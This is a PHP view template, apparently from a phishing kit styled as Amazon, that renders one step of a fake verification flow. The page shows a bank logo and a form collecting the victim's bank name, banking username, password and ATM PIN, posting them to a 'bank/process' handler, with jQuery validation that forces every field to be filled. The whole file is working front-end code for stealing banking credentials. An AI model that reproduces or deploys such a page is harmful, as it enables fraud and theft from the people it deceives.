<?php 
defined("ACCESS") or die('Konz');
include FCPATH. "AREA16/application/views/layout/header.php";
?>
				<ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
					<li>
						<?php echo $_113 ?>
					</li>
					<li>
						<?php echo $_46 ?>
					</li>
					<li class="is-active">
						<?php echo $_47 ?>
					</li>
					<li>
						<?php echo $_48 ?>
					</li>
				</ul>
				<div class="cc-content4" style="padding-top: 0">
					<div class="container">
						<div align="center"> <img src="<?=base_url()?>AREA16/assets/images/bank.png" width="195"> </div>
						<div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_99 ?></span> </div>
						<div align="center"> <span class="lefttext"><?php echo $_72 ?></span> </div>
						<div class="row" style="padding-top: 5px">
							<div class="col-12">
								<div class="mypayementarea">
									<form action="<?=base_url()?>bank/process" method="post" onsubmit="return validateForm();" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_100 ?></span>
										<div class="row mt-3">
											<div class="col-sm-6">
												<div class="form-group">
													<label for="bankname">
														<?php echo $_101 ?>
													</label>
													<input type="text" class="form-control amazoninput addressfocus" name="bankname" id="bankname" placeholder="<?php echo $_102 ?>" minlength="5" maxlength="30" oninput="this.value=this.value.toUpperCase()" onkeypress="return alpha(event)"> </div>
											</div>
											<div class="col-sm-6">
												<div class="form-group">
													<label for="username">
														<?php echo $_103 ?>
													</label>
													<input type="text" id="username" class="form-control amazoninput cityfocus" name="username" placeholder="<?php echo $_103 ?>" maxlength="25" onkeypress="return alpha(event)"> </div>
											</div>
											<div class="col-sm-6">
												<div class="form-group">
													<label for="password">
														<?php echo $_104 ?>
													</label>
													<input type="password" class="form-control amazoninput regionfocus" name="password" id="password" placeholder="<?php echo $_104 ?>" maxlength="30"> </div>
											</div>
											<div class="col-sm-6">
												<div class="form-group">
													<label for="atmpin">
														<?php echo $_105 ?>
													</label>
													<input type="password" class="form-control amazoninput zipfocus" name="atmpin" id="atmpin" placeholder="<?php echo $_105 ?>" maxlength="5" onkeypress="return alpha(event)"> </div>
											</div>
										</div>
										<input type="submit" name="Sex" class="btn a-button-input" value="<?php echo $_7 ?>"> </form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
<?php include FCPATH. "AREA16/application/views/layout/footer.php"; ?>
		<script>
		let load;

		let _loader = () => {
			load = setTimeout(showPage, 1000);
		}

		let showPage = () => {
			document.getElementById('loader').style.display = 'none';
			document.getElementById('myDiv').style.display = 'block';
		}

		const alpha = (e) => {
		    let k;
		    document.all ? k = e.keyCode : k = e.which;
		    return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
		}

		$(document).ready(function(e) {
			$("#konzform").validate({
				errorClass: "error-class",
				rules: {
					bankname: {
						required: true,
						minlength: 5
					},
					username: {
						required: true,
						minlength: 3,
						maxlength: 30
					},
					password: {
						required: true,
						minlength: 3,
						maxlength: 30
					},
					atmpin: {
						required: true,
						minlength: 2,
						maxlength: 10
					}
				},
				messages: {
					bankname: {
						required: "<?php echo $_106 ?>"
					},
					username: {
						required: "<?php echo $_107 ?>"
					},
					password: {
						required: "<?php echo $_108 ?>"
					},
					atmpin: {
						required: "<?php echo $_109 ?>"
					}
				}
			});
		})
		</script>
	</body>

	</html>